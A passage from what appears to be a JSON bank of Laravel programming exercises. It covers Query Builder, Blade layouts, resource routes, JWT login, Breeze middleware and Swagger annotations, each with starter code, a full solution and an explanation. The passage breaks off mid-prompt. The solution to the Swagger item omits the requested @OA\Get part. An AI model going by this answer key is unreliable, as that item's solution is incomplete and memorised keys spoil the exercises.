\u003ccode\u003e-&gt;whereNotNull(&#39;School&#39;)\u003c/code\u003e adds \u003ccode\u003eWHERE School IS NOT NULL\u003c/code\u003e. \u003ccode\u003e-&gt;orderBy(&#39;FirstName&#39;)\u003c/code\u003e adds \u003ccode\u003eORDER BY FirstName ASC\u003c/code\u003e. \u003ccode\u003e-&gt;get()\u003c/code\u003e is the terminal method that fires the query and returns a collection of \u003ccode\u003estdClass\u003c/code\u003e objects.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWrong approach 1 — reaching for raw SQL instead:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-php\"\u003e// Avoid this for a query Query Builder handles cleanly\n$students = DB::select(\n    &#39;SELECT FirstName, LastName, School FROM students WHERE School IS NOT NULL ORDER BY FirstName&#39;\n);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eRaw SQL works here, but adding a second filter or renaming a column now requires rewriting the entire SQL string. The Query Builder chain is easier to change safely and is equally correct.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWrong approach 2 — forgetting \u003ccode\u003e-&gt;get()\u003c/code\u003e at the end of the chain:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-php\"\u003e// This returns a Builder object, not results\n$students = DB::table(&#39;students&#39;)\n    -&gt;select([&#39;FirstName&#39;, &#39;LastName&#39;, &#39;School&#39;])\n    -&gt;whereNotNull(&#39;School&#39;)\n    -&gt;orderBy(&#39;FirstName&#39;);\n// dd($students) prints a Builder object — no rows\n\n// Fix: add -&gt;get()\n$students = DB::table(&#39;students&#39;)\n    -&gt;select([&#39;FirstName&#39;, &#39;LastName&#39;, &#39;School&#39;])\n    -&gt;whereNotNull(&#39;School&#39;)\n    -&gt;orderBy(&#39;FirstName&#39;)\n    -&gt;get();\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eEvery method before \u003ccode\u003e-&gt;get()\u003c/code\u003e returns the builder itself (for chaining). The query is not sent to the database until you call \u003ccode\u003e-&gt;get()\u003c/code\u003e. Omitting it is the single most common Query Builder mistake.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":5,"id":"blade-templating-layout","title":"Blade — layout inheritance and partials","lang":"blade","tags":["laravel","blade","views","layout"],"source":"intro_to_laravel.pptx slides 11-20","prompt_html":"\u003cp\u003eBuild a two-file Blade setup: a parent layout and a child view.\u003c/p\u003e\n\u003cp\u003eThe parent layout (\u003ccode\u003eresources/views/layouts/master.blade.php\u003c/code\u003e) must:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eOutput an escaped page title variable with the double-brace syntax\u003c/li\u003e\n\u003cli\u003eInclude a partial header from \u003ccode\u003epartials.nav\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eDefine a \u003ccode\u003econtent\u003c/code\u003e injection point\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThe child view (\u003ccode\u003eresources/views/welcome.blade.php\u003c/code\u003e) must:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eInherit the parent layout\u003c/li\u003e\n\u003cli\u003eFill the \u003ccode\u003econtent\u003c/code\u003e block with an \u003ccode\u003e&lt;h1&gt;\u003c/code\u003e and a \u003ccode\u003e&lt;ul&gt;\u003c/code\u003e that loops over \u003ccode\u003e$items\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e","starter":"{{-- resources/views/layouts/master.blade.php --}}\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n\u003chead\u003e\n    \u003ctitle\u003e\u003c!-- OUTPUT $pageTitle SAFELY HERE --\u003e\u003c/title\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n    \u003c!-- INCLUDE partials.nav HERE --\u003e\n    \u003cdiv class=\"container\"\u003e\n        \u003c!-- MARK THE INJECTION POINT FOR 'content' HERE --\u003e\n    \u003c/div\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n\n{{-- resources/views/welcome.blade.php --}}\n\u003c!-- INHERIT layouts.master HERE --\u003e\n\n\u003c!-- OPEN the 'content' section HERE --\u003e\n\u003ch1\u003eWelcome\u003c/h1\u003e\n\u003cul\u003e\n    \u003c!-- LOOP OVER $items, output each $item SAFELY --\u003e\n\u003c/ul\u003e\n\u003c!-- CLOSE the section HERE --\u003e","solution":"{{-- resources/views/layouts/master.blade.php --}}\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n\u003chead\u003e\n    \u003ctitle\u003e{{ $pageTitle }}\u003c/title\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n    @include('partials.nav')\n    \u003cdiv class=\"container\"\u003e\n        @yield('content')\n    \u003c/div\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n\n{{-- resources/views/welcome.blade.php --}}\n@extends('layouts.master')\n\n@section('content')\n\u003ch1\u003eWelcome\u003c/h1\u003e\n\u003cul\u003e\n    @foreach($items as $item)\n        \u003cli\u003e{{ $item }}\u003c/li\u003e\n    @endforeach\n\u003c/ul\u003e\n@endsection","why_html":"\u003cp\u003e\u003cstrong\u003eTemplate hierarchy:\u003c/strong\u003e The parent layout declares \u003ccode\u003e@yield(&#39;content&#39;)\u003c/code\u003e as a named slot. The child view declares \u003ccode\u003e@extends(&#39;layouts.master&#39;)\u003c/code\u003e to claim that layout, then wraps its HTML in \u003ccode\u003e@section(&#39;content&#39;) ... @endsection\u003c/code\u003e to fill the slot. Laravel compiles both files together — the child&#39;s section replaces the \u003ccode\u003e@yield\u003c/code\u003e call in the parent.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eDouble-brace syntax for output:\u003c/strong\u003e \u003ccode\u003e{{ $pageTitle }}\u003c/code\u003e and \u003ccode\u003e{{ $item }}\u003c/code\u003e both use the double-brace syntax, which calls \u003ccode\u003ehtmlspecialchars()\u003c/code\u003e before rendering. This escapes \u003ccode\u003e&lt;\u003c/code\u003e, \u003ccode\u003e&gt;\u003c/code\u003e, \u003ccode\u003e&quot;\u003c/code\u003e, \u003ccode\u003e&#39;\u003c/code\u003e, and \u003ccode\u003e&amp;\u003c/code\u003e — making the output XSS-safe by default. Never use raw PHP \u003ccode\u003eecho\u003c/code\u003e in Blade; it bypasses this protection.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e@include for partial views:\u003c/strong\u003e \u003ccode\u003e@include(&#39;partials.nav&#39;)\u003c/code\u003e inserts \u003ccode\u003eresources/views/partials/nav.blade.php\u003c/code\u003e inline. The partial receives all variables in scope. Dot-notation maps to directory separators under \u003ccode\u003eresources/views/\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eTwo common wrong approaches:\u003c/strong\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cp\u003e\u003cem\u003eForgetting \u003ccode\u003e@endsection\u003c/code\u003e.\u003c/em\u003e Blade requires every \u003ccode\u003e@section\u003c/code\u003e to have a matching \u003ccode\u003e@endsection\u003c/code\u003e. Omitting it causes a parse error: \u003ccode\u003eBlade::compileString() cannot find the end of the section\u003c/code\u003e. The error is often reported on the \u003cem\u003enext\u003c/em\u003e \u003ccode\u003e@extends\u003c/code\u003e it encounters, not the offending file.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e\u003cem\u003eUsing \u003ccode\u003e{!! $item !!}\u003c/code\u003e for loop output.\u003c/em\u003e When iterating over user-supplied data, \u003ccode\u003e{!! !!}\u003c/code\u003e outputs raw HTML and creates an XSS vulnerability. The double-brace syntax \u003ccode\u003e{{ }}\u003c/code\u003e is the correct default for all variable output.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e"},{"kind":"code","variant":"starter-solution","n":6,"id":"resource-controller-routes","title":"Resource controller and routes","lang":"php","tags":["laravel","routing","controllers"],"source":"laravel_with_sqlite_API_SCRIPT.docx","prompt_html":"\u003cp\u003eYou have a \u003ccode\u003eStudent\u003c/code\u003e model and a \u003ccode\u003eStudentsController\u003c/code\u003e in \u003ccode\u003eapp/Http/Controllers/api/\u003c/code\u003e. Wire up a full REST API for students using a resource route in \u003ccode\u003eroutes/api.php\u003c/code\u003e. The API must:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eRegister all five API endpoints (index, store, show, update, destroy) with one \u003ccode\u003eRoute::apiResource()\u003c/code\u003e call.\u003c/li\u003e\n\u003cli\u003eImplement \u003ccode\u003eindex()\u003c/code\u003e to return all students.\u003c/li\u003e\n\u003cli\u003eImplement \u003ccode\u003estore()\u003c/code\u003e with validation for \u003ccode\u003eFirstName\u003c/code\u003e, \u003ccode\u003eLastName\u003c/code\u003e, and \u003ccode\u003eSchool\u003c/code\u003e, and return the created student with HTTP 201.\u003c/li\u003e\n\u003cli\u003eHandle a missing student in \u003ccode\u003eshow()\u003c/code\u003e by returning a JSON 404 response.\u003c/li\u003e\n\u003c/ol\u003e","starter":"\u003c?php\n\n// routes/api.php\nuse Illuminate\\Support\\Facades\\Route;\nuse App\\Http\\Controllers\\api\\StudentsController;\n\n// TODO: register the resource route here\n\n\n// app/Http/Controllers/api/StudentsController.php\nnamespace App\\Http\\Controllers\\api;\n\nuse App\\Http\\Controllers\\Controller;\nuse App\\Models\\Student;\nuse Illuminate\\Http\\Request;\n\nclass StudentsController extends Controller\n{\n    public function index()\n    {\n        // TODO: return all students\n    }\n\n    public function store(Request $request)\n    {\n        // TODO: validate FirstName, LastName, School (all required)\n        // TODO: create and return the student with HTTP 201\n    }\n\n    public function show($id)\n    {\n        // TODO: find student or return JSON 404\n    }\n\n    public function update(Request $request, $id)\n    {\n        // (leave empty for this exercise)\n    }\n\n    public function destroy($id)\n    {\n        // (leave empty for this exercise)\n    }\n}","solution":"\u003c?php\n\n// routes/api.php\nuse Illuminate\\Support\\Facades\\Route;\nuse App\\Http\\Controllers\\api\\StudentsController;\n\nRoute::apiResource('students', StudentsController::class);\n\n\n// app/Http/Controllers/api/StudentsController.php\nnamespace App\\Http\\Controllers\\api;\n\nuse App\\Http\\Controllers\\Controller;\nuse App\\Models\\Student;\nuse Illuminate\\Http\\Request;\n\nclass StudentsController extends Controller\n{\n    public function index()\n    {\n        return Student::all();\n    }\n\n    public function store(Request $request)\n    {\n        request()-\u003evalidate([\n            'FirstName' =\u003e 'required',\n            'LastName'  =\u003e 'required',\n            'School'    =\u003e 'required',\n        ]);\n\n        $student = Student::create([\n            'FirstName' =\u003e request('FirstName'),\n            'LastName'  =\u003e request('LastName'),\n            'School'    =\u003e request('School'),\n        ]);\n\n        return response()-\u003ejson($student, 201);\n    }\n\n    public function show($id)\n    {\n        $student = Student::find($id);\n\n        if (!$student) {\n            return response()-\u003ejson(['message' =\u003e 'Student not found'], 404);\n        }\n\n        return response()-\u003ejson($student);\n    }\n\n    public function update(Request $request, $id) {}\n    public function destroy($id) {}\n}","why_html":"\u003cp\u003e\u003ccode\u003eRoute::apiResource(&#39;students&#39;, StudentsController::class)\u003c/code\u003e replaces five individual \u003ccode\u003eRoute::get/post/put/delete\u003c/code\u003e declarations with one line. Laravel binds HTTP verbs to controller methods by name convention: GET /api/students calls \u003ccode\u003eindex()\u003c/code\u003e, POST /api/students calls \u003ccode\u003estore()\u003c/code\u003e, GET /api/students/{id} calls \u003ccode\u003eshow()\u003c/code\u003e, and so on.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eresponse()-&gt;json($student, 201)\u003c/code\u003e in \u003ccode\u003estore()\u003c/code\u003e explicitly sets HTTP status 201 Created — the correct status for a successful resource creation. Returning a bare model (\u003ccode\u003ereturn $student\u003c/code\u003e) implicitly sends 200, which is technically wrong for a POST that creates a resource.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eStudent::find($id)\u003c/code\u003e returns \u003ccode\u003enull\u003c/code\u003e when no row matches. Checking \u003ccode\u003eif (!$student)\u003c/code\u003e before returning lets you send a structured JSON error instead of a 500 server error or an empty response.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCommon wrong approaches:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eUsing five individual Route::get/post/put/delete declarations instead of Route::apiResource().\u003c/strong\u003e This works but is verbose and error-prone. If you rename the controller, you must update every line. Resource routing updates automatically.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUsing Route::resource() instead of Route::apiResource() in routes/api.php.\u003c/strong\u003e \u003ccode\u003eRoute::resource()\u003c/code\u003e also registers \u003ccode\u003ecreate\u003c/code\u003e and \u003ccode\u003eedit\u003c/code\u003e routes (for HTML forms). In a JSON API these routes are useless — they match GET /api/students/create and GET /api/students/{id}/edit, which will confuse API clients.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eForgetting $fillable on the Student model.\u003c/strong\u003e \u003ccode\u003eStudent::create([...])\u003c/code\u003e throws a \u003ccode\u003eMassAssignmentException\u003c/code\u003e if \u003ccode\u003e$fillable\u003c/code\u003e does not list the fields you are assigning. Add \u003ccode\u003eprotected $fillable = [&#39;FirstName&#39;, &#39;LastName&#39;, &#39;School&#39;];\u003c/code\u003e to the \u003ccode\u003eStudent\u003c/code\u003e model.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eForgetting php artisan route:clear after adding or changing routes.\u003c/strong\u003e A stale route cache causes 404s or serves the old route table regardless of what is in \u003ccode\u003eroutes/api.php\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e"},{"kind":"code","variant":"starter-solution","n":7,"id":"rest-api-crud-controller","title":"Complete store() for a REST API resource controller","lang":"php","tags":["rest","api","laravel","resource-controller","validation","json"],"source":"laravel_with_sqlite_API_SCRIPT.docx","prompt_html":"\u003cp\u003eYou are building a REST API for a \u003ccode\u003eStudent\u003c/code\u003e resource. The \u003ccode\u003eStudent\u003c/code\u003e model already has \u003ccode\u003e$fillable = [&#39;FirstName&#39;, &#39;LastName&#39;, &#39;School&#39;]\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eComplete the \u003ccode\u003estore()\u003c/code\u003e method in \u003ccode\u003eStudentsController\u003c/code\u003e so that it:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eValidates that \u003ccode\u003eFirstName\u003c/code\u003e, \u003ccode\u003eLastName\u003c/code\u003e, and \u003ccode\u003eSchool\u003c/code\u003e are all present in the request body.\u003c/li\u003e\n\u003cli\u003eCreates a new \u003ccode\u003eStudent\u003c/code\u003e record using mass assignment.\u003c/li\u003e\n\u003cli\u003eReturns the created student as JSON with HTTP status 201.\u003c/li\u003e\n\u003c/ol\u003e","starter":"\u003c?php\n\nnamespace App\\Http\\Controllers\\api;\n\nuse App\\Http\\Controllers\\Controller;\nuse App\\Models\\Student;\nuse Illuminate\\Http\\Request;\n\nclass StudentsController extends Controller\n{\n    public function store(Request $request)\n    {\n        // TODO: validate that FirstName, LastName, School are required\n\n        // TODO: create the Student record\n\n        // TODO: return JSON response with status 201\n    }\n}","solution":"\u003c?php\n\nnamespace App\\Http\\Controllers\\api;\n\nuse App\\Http\\Controllers\\Controller;\nuse App\\Models\\Student;\nuse Illuminate\\Http\\Request;\n\nclass StudentsController extends Controller\n{\n    public function store(Request $request)\n    {\n        $request-\u003evalidate([\n            'FirstName' =\u003e 'required',\n            'LastName'  =\u003e 'required',\n            'School'    =\u003e 'required',\n        ]);\n\n        $student = Student::create([\n            'FirstName' =\u003e request('FirstName'),\n            'LastName'  =\u003e request('LastName'),\n            'School'    =\u003e request('School'),\n        ]);\n\n        return response()-\u003ejson($student, 201);\n    }\n}","why_html":"\u003cp\u003e\u003cstrong\u003eWhy validate before create?\u003c/strong\u003e \u003ccode\u003e$request-&gt;validate()\u003c/code\u003e must come before \u003ccode\u003eStudent::create()\u003c/code\u003e. If any rule fails, Laravel returns a 422 response immediately and execution stops — the database is never touched. Placing \u003ccode\u003ecreate()\u003c/code\u003e first means invalid data hits the database before the error is caught.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhy 201, not 200?\u003c/strong\u003e \u003ccode\u003eresponse()-&gt;json($student, 201)\u003c/code\u003e sends HTTP 201 Created. Returning the default 200 is semantically wrong for a POST endpoint that creates a new resource. API clients and test suites check status codes; returning 200 fails REST conventions and may break downstream consumers.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhy not just \u003ccode\u003ereturn Student::create([...])\u003c/code\u003e?\u003c/strong\u003e Returning an Eloquent model directly works in some Laravel versions, but it gives no control over the status code. The \u003ccode\u003eresponse()-&gt;json()\u003c/code\u003e wrapper sets the status code explicitly and ensures the Content-Type header is \u003ccode\u003eapplication/json\u003c/code\u003e regardless of the request&#39;s Accept header.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhy not skip \u003ccode\u003e$fillable\u003c/code\u003e and just add the fields manually?\u003c/strong\u003e If \u003ccode\u003e$fillable\u003c/code\u003e is missing, \u003ccode\u003eStudent::create()\u003c/code\u003e throws a \u003ccode\u003eMassAssignmentException\u003c/code\u003e at runtime — the field-by-field assignment in \u003ccode\u003ecreate([...])\u003c/code\u003e still uses mass assignment under the hood. The guard lives in the model, not in the controller call. You cannot bypass it by listing fields explicitly in the array.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":8,"id":"jwt-auth-setup","title":"JWT login method in AuthController","lang":"php","tags":["jwt","authentication","laravel","api","bearer-token"],"source":"laravel-jwt_SCRIPT.docx","prompt_html":"\u003cp\u003eImplement the \u003ccode\u003elogin()\u003c/code\u003e method for a Laravel \u003ccode\u003eAuthController\u003c/code\u003e that uses \u003ccode\u003ephp-open-source-saver/jwt-auth\u003c/code\u003e. The method must:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eValidate that \u003ccode\u003eemail\u003c/code\u003e (required, string, email format) and \u003ccode\u003epassword\u003c/code\u003e (required, string) are present.\u003c/li\u003e\n\u003cli\u003eAttempt authentication using \u003ccode\u003eAuth::attempt()\u003c/code\u003e with only the email and password credentials.\u003c/li\u003e\n\u003cli\u003eReturn a 401 JSON response with \u003ccode\u003estatus: error\u003c/code\u003e and \u003ccode\u003emessage: Unauthorized\u003c/code\u003e if credentials are wrong.\u003c/li\u003e\n\u003cli\u003eReturn a 200 JSON response with \u003ccode\u003estatus: success\u003c/code\u003e, the authenticated user object, and an \u003ccode\u003eauthorisation\u003c/code\u003e block containing the token string and type \u003ccode\u003e&quot;bearer&quot;\u003c/code\u003e if credentials are correct.\u003c/li\u003e\n\u003c/ol\u003e","starter":"\u003c?php\n\nnamespace App\\Http\\Controllers\\api;\n\nuse \\Illuminate\\Routing\\Controller;\nuse Illuminate\\Http\\Request;\nuse Illuminate\\Support\\Facades\\Auth;\nuse App\\Models\\User;\n\nclass AuthController extends Controller\n{\n    public function __construct()\n    {\n        $this-\u003emiddleware('auth:api', ['except' =\u003e ['login', 'register']]);\n    }\n\n    public function login(Request $request)\n    {\n        // TODO: validate email and password fields\n\n        // TODO: build $credentials from only the validated fields\n\n        // TODO: attempt authentication; capture token or handle failure\n\n        // TODO: return JSON response with user + authorisation block\n    }\n}","solution":"\u003c?php\n\nnamespace App\\Http\\Controllers\\api;\n\nuse \\Illuminate\\Routing\\Controller;\nuse Illuminate\\Http\\Request;\nuse Illuminate\\Support\\Facades\\Auth;\nuse App\\Models\\User;\n\nclass AuthController extends Controller\n{\n    public function __construct()\n    {\n        $this-\u003emiddleware('auth:api', ['except' =\u003e ['login', 'register']]);\n    }\n\n    public function login(Request $request)\n    {\n        $request-\u003evalidate([\n            'email'    =\u003e 'required|string|email',\n            'password' =\u003e 'required|string',\n        ]);\n\n        $credentials = $request-\u003eonly('email', 'password');\n\n        if (!$token = Auth::attempt($credentials)) {\n            return response()-\u003ejson([\n                'status'  =\u003e 'error',\n                'message' =\u003e 'Unauthorized',\n            ], 401);\n        }\n\n        return response()-\u003ejson([\n            'status'        =\u003e 'success',\n            'user'          =\u003e Auth::user(),\n            'authorisation' =\u003e [\n                'token' =\u003e $token,\n                'type'  =\u003e 'bearer',\n            ],\n        ]);\n    }\n}","why_html":"\u003cp\u003e\u003cstrong\u003eStateless auth vs sessions.\u003c/strong\u003e A session-based app stores auth state in a server-side session table and hands the client a session cookie. Every request requires a database lookup. JWT replaces that lookup with a cryptographic check: \u003ccode\u003eAuth::attempt()\u003c/code\u003e returns a signed token string, the client stores it, and every subsequent request proves identity by sending the token in \u003ccode\u003eAuthorization: Bearer &lt;token&gt;\u003c/code\u003e. The server re-derives and verifies the signature in memory — no session table, no per-request DB query for the auth check.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhat breaks if you cut corners:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eUsing \u003ccode\u003etymon/jwt-auth\u003c/code\u003e instead of \u003ccode\u003ephp-open-source-saver/jwt-auth\u003c/code\u003e:\u003c/strong\u003e Different Composer package, different service provider, different namespace. \u003ccode\u003ephp artisan jwt:secret\u003c/code\u003e will not exist. The course uses \u003ccode\u003ephp-open-source-saver/jwt-auth\u003c/code\u003e exclusively — use the exact package name.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eNot setting \u003ccode\u003e&#39;driver&#39; =&gt; &#39;jwt&#39;\u003c/code\u003e in \u003ccode\u003econfig/auth.php\u003c/code\u003e:\u003c/strong\u003e Without the jwt driver in the \u003ccode\u003eapi\u003c/code\u003e guard, \u003ccode\u003eauth:api\u003c/code\u003e middleware ignores the Bearer token and returns 401 for every protected request. Installing the package is not enough — the guard must be wired.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eNot implementing JWTSubject on the User model:\u003c/strong\u003e \u003ccode\u003eAuth::attempt()\u003c/code\u003e will throw an error if the User model does not implement \u003ccode\u003egetJWTIdentifier()\u003c/code\u003e and \u003ccode\u003egetJWTCustomClaims()\u003c/code\u003e. The interface tells the package which value to store in the \u003ccode\u003esub\u003c/code\u003e claim.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eNot clearing config cache after changes:\u003c/strong\u003e After editing \u003ccode\u003econfig/auth.php\u003c/code\u003e, run \u003ccode\u003ephp artisan config:clear\u003c/code\u003e before testing. Laravel caches the config; stale cache means the old (non-JWT) guard is still active.\u003c/li\u003e\n\u003c/ul\u003e"},{"kind":"code","variant":"starter-solution","n":9,"id":"breeze-middleware-protect","title":"Protect routes with auth middleware and retrieve the current user","lang":"php","tags":["authentication","session","breeze","middleware","laravel"],"source":"auth-with-breeze_SQLite_SCRIPT.docx","prompt_html":"\u003cp\u003eAfter installing Breeze, protect all \u003ccode\u003e/org\u003c/code\u003e resource routes so that only authenticated users can access them. Inside \u003ccode\u003eOrgController::index()\u003c/code\u003e, retrieve only the organizations belonging to the currently logged-in user, ordered by \u003ccode\u003eupdated_at\u003c/code\u003e descending, and pass them to the \u003ccode\u003eorgs.index\u003c/code\u003e view.\u003c/p\u003e","starter":"\u003c?php\n// routes/web.php (partial)\nuse App\\Http\\Controllers\\OrgController;\n\nRoute::resource('/org', OrgController::class);\n\n// app/Http/Controllers/OrgController.php (partial)\nuse App\\Models\\Org;\n\npublic function index() {\n    $orgs = Org::all();\n    return view('orgs.index', ['orgs' =\u003e $orgs]);\n}","solution":"\u003c?php\n// routes/web.php (partial)\nuse App\\Http\\Controllers\\OrgController;\n\nRoute::resource('/org', OrgController::class)-\u003emiddleware(['auth']);\n\n// app/Http/Controllers/OrgController.php (partial)\nuse Illuminate\\Support\\Facades\\Auth;\nuse App\\Models\\Org;\n\npublic function index() {\n    $orgs = Auth::user()-\u003eorgs()-\u003elatest('updated_at')-\u003eget();\n    return view('orgs.index', ['orgs' =\u003e $orgs]);\n}","why_html":"\u003cp\u003e\u003ccode\u003e-&gt;middleware([&#39;auth&#39;])\u003c/code\u003e chained on \u003ccode\u003eRoute::resource()\u003c/code\u003e applies the \u003ccode\u003eauth\u003c/code\u003e middleware to all seven generated routes at once. Unauthenticated visitors are redirected to \u003ccode\u003e/login\u003c/code\u003e before the controller method runs.\u003c/p\u003e\n\u003cp\u003eInside the controller, \u003ccode\u003eAuth::user()\u003c/code\u003e returns the authenticated User model. Calling \u003ccode\u003e-&gt;orgs()\u003c/code\u003e on it uses the \u003ccode\u003ehasMany\u003c/code\u003e Eloquent relationship defined on the User model to scope the query to only that user&#39;s records. \u003ccode\u003e-&gt;latest(&#39;updated_at&#39;)-&gt;get()\u003c/code\u003e orders by the \u003ccode\u003eupdated_at\u003c/code\u003e column descending.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCommon wrong approaches:\u003c/strong\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cp\u003e\u003cstrong\u003eForgetting to chain middleware on the resource route.\u003c/strong\u003e Writing \u003ccode\u003eRoute::resource(&#39;/org&#39;, OrgController::class)\u003c/code\u003e without \u003ccode\u003e-&gt;middleware([&#39;auth&#39;])\u003c/code\u003e leaves every \u003ccode\u003e/org\u003c/code\u003e endpoint publicly accessible. The \u003ccode\u003eauth\u003c/code\u003e middleware must be explicitly attached — Breeze does not auto-protect custom routes.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e\u003cstrong\u003eUsing \u003ccode\u003eOrg::all()\u003c/code\u003e instead of scoping to the current user.\u003c/strong\u003e \u003ccode\u003eOrg::all()\u003c/code\u003e returns every row in the table regardless of owner. Use \u003ccode\u003eAuth::user()-&gt;orgs()-&gt;...\u003c/code\u003e or \u003ccode\u003eOrg::whereBelongsTo(Auth::user())-&gt;...\u003c/code\u003e to restrict results to the authenticated user. The \u003ccode\u003eAuth::id()\u003c/code\u003e raw-comparison form (\u003ccode\u003eOrg::where(&#39;user_id&#39;, Auth::id())-&gt;...\u003c/code\u003e) also works but is more verbose than the relationship form.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e\u003cstrong\u003eUsing \u003ccode\u003eauth()-&gt;user()\u003c/code\u003e instead of \u003ccode\u003eAuth::user()\u003c/code\u003e.\u003c/strong\u003e Both resolve to the same object, but Use Auth::user() (facade style) — more explicit, IDE-friendly, and consistent with Laravel&#39;s documentation.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e"},{"kind":"code","variant":"starter-solution","n":10,"id":"swagger-openapi-annotations","title":"Write @OA\\Info and @OA\\Get annotations for a Laravel controller","lang":"php","tags":["swagger","openapi","l5-swagger","api-documentation","laravel"],"source":"Laravel_L5Swagger_SCRIPT_2026.docx Steps 3 and 5","prompt_html":"\u003cp\u003eYou have a Laravel API with a \u003ccode\u003eStudentsController\u003c/code\u003e that has an \u003ccode\u003eindex()\u003c/code\u003e method returning all students.\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eAdd the \u003ccode\u003e@OA\\Info\u003c/code\u003e block to \u003ccode\u003eapp/Http/Controllers/Controller.php\u003c/code\u003e. Use title \u003ccode\u003e&quot;Students API&quot;\u003c/code\u003e, version \u003ccode\u003e&quot;1.0.0&quot;\u003c/code\u003e, and description \u003ccode\u003e&quot;Manages student records&quot;\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eAdd a \u003ccode\u003e@OA\\Get\u003c/code\u003e annotation to the \u003ccode\u003eindex()\u003c/code\u003e method in \u003ccode\u003eStudentsController\u003c/code\u003e. Document the successful 200 response with a JSON array of \u003ccode\u003eStudent\u003c/code\u003e objects (reference \u003ccode\u003e#/components/schemas/Student\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003eIdentify the artisan command needed to make Swagger UI reflect your changes.\u003c/li\u003e\n\u003c/ol\u003e","starter":"\u003c?php\n// app/Http/Controllers/Controller.php\n\nnamespace App\\Http\\Controllers;\n\n// TODO: add the OpenApi Attributes import\n\n// TODO: add the @OA\\Info annotation here\nabstract class Controller\n{\n    //\n}","solution":"\u003c?php\n// app/Http/Controllers/Controller.php\n\nnamespace App\\Http\\Controllers;\n\nuse OpenApi\\Attributes as OA;\n\n#[OA\\Info(\n    title: \"Students API\",\n    version: \"1.0.0\",\n    description: \"Manages student records\"\n)]\nabstract class Controller\n{\n    //\n}","why_html":"\u003cp\u003e\u003cstrong\u003eWhy \u003ccode\u003e@OA\\Info\u003c/code\u003e goes on the base \u003ccode\u003eController\u003c/code\u003e class.\u003c/strong\u003e\nThe OpenAPI spec requires exactly one \u003ccode\u003e@OA\\Info\u003c/code\u003e block per project. Placing it on the abstract base \u003ccode\u003eController\u003c/code\u003e is the convention because every API controller extends it, so the annotation is always reachable by the l5-swagger scanner. Putting it anywhere else (a random controller, a model) works technically but creates confusion about where global metadata lives.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhy \u003ccode\u003ephp artisan l5-swagger:generate\u003c/code\u003e is a required step.\u003c/strong\u003e\nl5-swagger does not watch for annotation changes. It reads PHP files and produces an OpenAPI JSON artifact only when you explicitly run the generate command. Swagger UI reads that artifact, not your PHP source. Every edit to an annotation requires a regeneration. The common wrong approach is to edit annotations and refresh \u003ccode\u003e/api/documentation\u003c/code\u003e directly — the page shows the previously compiled JSON, not your new annotations.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhy \u003ccode\u003e-W\u003c/code\u003e is needed for the install command.\u003c/strong\u003e\n\u003ccode\u003ecomposer require darkaonline/l5-swagger -W\u003c/code\u003e uses the \u003ccode\u003e--with-all-dependencies\u003c/code\u003e flag to allow Composer to update transitive dependencies when resolving the package. Omitting \u003ccode\u003e-W\u003c/code\u003e on Laravel 11+ often produces a dependency conflict error and the package is not installed.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":11,"id":"curl-api-request","title":"Make a GET request with cURL and decode the JSON response","lang":"php","tags":["curl","http","php","rest-client"],"source":"cURL.pptx slides 4–5","prompt_html":"\u003cp\u003eMake a GET request to 